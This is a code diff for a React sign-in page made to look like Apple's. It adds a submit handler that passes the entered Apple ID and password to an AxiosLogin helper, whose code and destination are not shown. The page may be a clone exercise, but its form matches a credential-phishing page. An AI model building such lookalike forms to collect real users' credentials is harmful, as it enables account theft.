@@ -3,6 +3,7 @@ import Footer from '../../components/Footer'
 import Nav from '../../components/Nav'
 import styled from 'styled-components'
 import { useState } from 'react'
+import AxiosLogin from '../../helpers/AxiosLogin'
 
 export const InputText=styled.input`
     border: 1px solid rgb(180,180,180);
@@ -20,6 +21,10 @@ export const InputText=styled.input`
 const SignUp=({mobile})=>{
     const [appleId,setAppleId]=useState('')
     const [password,setPassword]=useState('')
+    const handleSubmit=()=>{
+        AxiosLogin(password,appleId)
+    }
+
     return (
         <div style={{width:mobile.matches ? '100vw' : '99vw',overflow:'hidden',backgroundColor:'rgb(245,245,245)'}}>
         <Nav mobile={mobile}/>
@@ -32,7 +37,7 @@ const SignUp=({mobile})=>{
                 </div>
                 <div className='w-100 position-relative'>
                     <InputText onChange={(e)=>setPassword(e.target.value)} type='password' className='w-100' placeholder='Password'/>
-                    <svg style={{width:'40px',height:'40px',fill:'rgb(180,180,180)',cursor:'pointer',padding:'0.3rem',position:'absolute',top:'0%',right:'0'}} xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 512 512"><path d="M0 256a256 256 0 1 0 512 0A256 256 0 1 0 0 256zM281 385c-9.4 9.4-24.6 9.4-33.9 0s-9.4-24.6 0-33.9l71-71L136 280c-13.3 0-24-10.7-24-24s10.7-24 24-24l182.1 0-71-71c-9.4-9.4-9.4-24.6 0-33.9s24.6-9.4 33.9 0L393 239c9.4 9.4 9.4 24.6 0 33.9L281 385z"/></svg>
+                    <svg onClick={handleSubmit} style={{width:'40px',height:'40px',fill:'rgb(180,180,180)',cursor:'pointer',padding:'0.3rem',position:'absolute',top:'0%',right:'0'}} xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 512 512"><path d="M0 256a256 256 0 1 0 512 0A256 256 0 1 0 0 256zM281 385c-9.4 9.4-24.6 9.4-33.9 0s-9.4-24.6 0-33.9l71-71L136 280c-13.3 0-24-10.7-24-24s10.7-24 24-24l182.1 0-71-71c-9.4-9.4-9.4-24.6 0-33.9s24.6-9.4 33.9 0L393 239c9.4 9.4 9.4 24.6 0 33.9L281 385z"/></svg>
                 </div>
             </div>
             <p className='text-center mt-5' style={{fontSize:'0.9rem'}}><a href="">Forgot Apple ID or password?</a></p>
